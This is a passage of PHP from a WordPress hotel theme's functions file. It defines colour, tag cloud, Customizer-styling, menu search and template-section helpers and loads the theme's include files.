	if ( isset( $attr['sizes'] ) ) {
		$html = str_replace( $attr['sizes'], '100vw', $html );
	}
	return $html;
}
add_filter( 'get_header_image_tag', 'hotel_wp_header_image_tag', 10, 3 );


/**
 * Return rgb value of a $hex - hexadecimal color value with given $a - alpha value
 * Ex:- hotel_wp_rgba('#11ffee',15) // return rgba(17,255,238,15)
 *
 * @since hotel-wp-lite 1.0
**/

function hotel_wp_rgba($hex,$a){

	$r = hexdec(substr($hex,1,2));
	$g = hexdec(substr($hex,3,2));
	$b = hexdec(substr($hex,5,2));
	$result = 'rgba('.$r.','.$g.','.$b.','.$a.')';

	return $result;
}

/**
 * Modifies tag cloud widget arguments to display all tags in the same font size
 * and use list format for better accessibility.
 *
 * @since hotel-wp-lite 1.0
 *
 * @param array $args Arguments for tag cloud widget.
 * @return array The filtered arguments for tag cloud widget.
 */
function hotel_wp_widget_tag_cloud_args( $args ) {
	$args['largest']  = 1;
	$args['smallest'] = 1;
	$args['unit']     = 'em';
	$args['format']   = 'list';

	return $args;
}
add_filter( 'widget_tag_cloud_args', 'hotel_wp_widget_tag_cloud_args' );

/**
 * Custom template tags for this theme.
*/
require get_parent_theme_file_path( '/inc/template-tags.php' );

/* load default data, default settings are stored in template-tags.php */


/**
* Additional features to allow styling of the templates.
*/
require HOTEL_WP_TEMPLATE_DIR.'/inc/template-functions.php';

if ( class_exists( 'WP_Customize_Control' ) ) {

	// Inlcude the Alpha Color Picker control file.
	require HOTEL_WP_TEMPLATE_DIR.'/inc/color-picker/alpha-color-picker.php';

}

/**
 * fontawesome icons functions and filters.
 */
require HOTEL_WP_TEMPLATE_DIR.'/inc/icon-functions.php';

/**
 * Customizer additions.
 */

require HOTEL_WP_TEMPLATE_DIR.'/inc/customizer.php';


/**
 * Display footer custom color CSS.
 */
function hotel_wp_footer_css_container() {

?>
	<style type="text/css" id="custom-footer-colors" >
		<?php echo hotel_wp_footer_foreground_css(); ?>
	</style>
<?php
}
add_action( 'wp_head', 'hotel_wp_footer_css_container' );

/**
 * This function adds some styles to the WordPress Customizer
 */
function hotel_wp_customizer_styles() { ?>
	<style>
		#customize-theme-controls .accordion-section-title {
			font-weight:500;
			background-color:white;
			color: #353030;
		}
		#customize-controls .wp-full-overlay-sidebar-content, .wp-full-overlay-main {background-color:rgb(233, 239, 243);}
		#customize-footer-actions, .wp-full-overlay-footer .devices {background-color:rgb(233, 239, 243);}
		.wp-full-overlay-sidebar .wp-full-overlay-header, .customize-controls-close, .customize-section-back, .customize-section-back:focus {background-color: #fff;}
		.customize-controls-close { border-top:4px solid #FFF;}
		#accordion-section-hotel_wp_lite .accordion-section-title {color:#eda81b;font-weight: 600;}

	</style>
	<?php
}
add_action( 'customize_controls_print_styles', 'hotel_wp_customizer_styles', 999 );

/*
 * add search form to top menu
 */
add_theme_support( 'html5', array( 'search-form' ) );
add_filter('wp_nav_menu_items', 'hotel_wp_add_search_form_to_menu', 10, 2);
function hotel_wp_add_search_form_to_menu($items, $args) {
  // If this isn't the main navbar menu, do nothing
  if(  !($args->theme_location == 'top') ) // with Customizr Pro 1.2+ and Cusomizr 3.4+ you can chose to display the saerch box to the secondary menu, just replacing 'main' with 'secondary'
    return $items;
  // On main menu: put styling around search and append it to the menu items
  return $items . '<li style="color:#eee;" class="my-nav-menu-search"><a id="myBtn" href="#"><i class="fa fa-search" style="color:#eee; font-size:18px;"></i>
  </a></li>';
}


/*
 * Display template by name. Available template sections are as follows,
 * slider, news,portfolio, questions,service, skills, stats, team, testimonials, woocommerce, callout
 */
function hotel_wp_featured_area($args, $featured_div = true){
	//dropdown not showing with featured area = overflow - hidden
	if($args=='booking')
	$featured_div=false;

	if($featured_div==true) {
	   echo '<div class="featured-section">';
	   get_template_part( '/sections/'.$args, 'section' );
	   echo '</div>';
	}else{
       get_template_part( '/sections/'.$args, 'section' );
	}
}


/* Load widgets */
if($hotel_wp_option['widget_posts']){
	require  HOTEL_WP_TEMPLATE_DIR.'/inc/widget-posts.php';
}

/**
 * TGM plugin.
 */
if(is_admin()){
	require HOTEL_WP_TEMPLATE_DIR.'/inc/plugin-activation.php';
}
